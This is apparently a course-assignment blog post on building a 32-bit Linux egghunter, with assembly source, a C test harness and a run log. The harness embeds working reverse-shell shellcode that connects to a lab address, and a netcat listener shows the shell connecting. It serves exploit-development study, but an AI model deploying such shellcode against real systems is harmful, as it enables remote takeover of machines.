---
layout: post
title: SLAE 3 - Egghunter Shellcode
date:   2019-03-07
categories: [SLAE, Assembly]
---
# Creating an egghunter

In the past I have read about egghunters so I know their purpose and the general idea of how they work but I have never tried to create one or walk through actual implementation strategies.  Corelan has a great exploit writing series that involves a piece on egghunters in detail: \
The article references Skape's write up on egghunters and suggests that it should be a good starting point. So, I'll start with Skape's write up, then move to corelan, and then for extra reading.. the heap only egghunter seems interesting.
1. http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf \
2. https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
3. http://r00tin.blogspot.com/2009/03/heap-only-egg-hunter.html 

- Egg size is best at 8 bytes
  * A 4 byte key that appears 2 times in a row.  This is because the 4 byte key is stored in memory and making it repeat avoids the situation that it runs into it's own stored key instead of the buffer.
  * This also increases speed because instead of searching for two unique keys it can search for 1 key twice in a row
- Some implementations require that the egg is executable assembly because control is passed to the egg and it will continue execution right into the payload after the egg.  
  * One could create an egghunter that jumps 8 bytes ahead of the egg but that creates unnecessary overhead (solution to this is in skape's writeup)
  * The implementation we will use checks the key with scasd which increases the pointer value by 4 each time we use it.  This is exacly what we need and reduces size while improving our egghunter.

- In 32-bit Linux, the best option for traversing memory without crashing would be to abuse the system call functionality.  Most system calls will return the EFAULT error code if it comes across an invalid memory address.  This can then be used to avoid dereferencing that address and keep from crashing the program.
  * A note is that if we find an invalid memory address, we increase the memory address that we are searching for by 0x1000 (PAGE_SIZE).  This is because if the address is invalid, the entire page will be invalid so we can just skip to the next.  If the address is valid but does not match the key/egg, then we increase by one to continue checking the next memory address in line.

Implementation strategy with system call access(2):
- int access(const char *pathname, int mode);

The syscall number can be found at /usr/include/asm/unistd.h
```c
#define __NR_access 33
```

So our steps are:
1. Prepare the key we will be searching for (4 bytes since our egg will be the key 2 times in a row)
2. Prepare the beginning memory address to check
3. Check if address is valid memory space, if not, we can skip by page size (0x1000) since the entire page will be invalid. Then repeat the memory check.
4. Address is valid.. now we check if the address we are at equals our key, if not, increase memory address by 1 and repeat from step 3
5. First half of egg identified, check address + 4 = key again.  If not, increase memory by 1 and repeat from step 3.
6. Egg found, pass execution to our identified address

One issue I ran in to was that ECX not getting zero'd out at the start caused the egghunter to fail when checking for valid addresses.  It would return an error that did not match EFAULT which led to the invalid address getting dereferenced -> segfault.  So, a short term solution was to just add the instruction to also zero out ecx.

```asm
global _start

section .text

_start:
  xor edx, edx
  xor ecx, ecx
new_page:
  or dx, 0xfff

inc_addr:
  inc edx
  
  lea ebx, [edx+0x4]
  
  push byte 0x21
  pop eax
  
  int 0x80    ; checking address
  
  cmp al, 0xf2  ; check if valid
  jz new_page
  
  ; valid address, check for egg
  mov eax, 0x50905090    
  mov edi, edx
  
  ; scasd compares value in eax to value at edi AND increases the pointer by 4 so we can use this to shorten our shellcode
  scasd
  jnz inc_addr
  
  ; match! check again for 2nd half of egg
  scasd
  jnz inc_addr
  
  ; found our egg, pass execution to this address (start of shellcode since scasd increased to AFTER our egg!)
  jmp edi
```

Time to test it..
Compile nasm, check for nulls, add to wrapper.  The wrapper below has the shellcode from the reverse shell (previously made):
```c
#include<stdio.h>
#include<string.h>

unsigned char egghunter[] = \
"\x31\xd2\x31\xc9\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

unsigned char code[] = \
"\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\x43\x68\xc0\xa8\xf7\x83\x66\x68\x11\x5c\x66\x53\x43\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x89\xfb\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80";

main()
{
	printf("Egghunter Length: %d\n", strlen(egghunter));
	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())egghunter;

	ret();

}
```
You can see that we have adjusted the wrapper a little from previous write ups.  The code array has the egg at the beginning now and we have added the egghunter.  Running strace with the egghunter shows that the egghunter is properly searching all the memory addresses. 

Test it:
```
./shellcode
Egghunter Length: 37
Shellcode Length:  87
```
Receiving reverse shell and issuing command:
```
nc -lvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [192.168.247.131] port 4444 [tcp/*] accepted (family 2, sport 48834)
who
pwoer    tty7    Dec 11 10:13 (:0)
```
